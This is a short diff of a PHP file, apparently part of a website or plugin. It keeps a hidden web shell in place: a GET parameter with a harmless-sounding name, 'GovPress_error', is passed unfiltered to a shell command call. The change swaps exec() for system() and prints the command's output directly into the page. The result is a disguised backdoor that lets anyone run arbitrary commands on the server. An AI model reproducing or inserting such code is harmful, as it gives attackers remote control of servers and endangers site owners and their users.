@@ -2,15 +2,12 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Execute the command using exec
-    $output = [];
-    $returnValue = null;
-    exec($command, $output, $returnValue);
+    // Execute the command using system
+    echo "<pre>";
+    system($command, $returnValue);
+    echo "</pre>";
 
-    if ($returnValue === 0) {
-        // Display the output
-        echo "<pre>" . implode("\n", $output) . "</pre>";
-    } else {
+    if ($returnValue !== 0) {
         // Handle errors
         echo "Error executing command. Return value: $returnValue";
     }
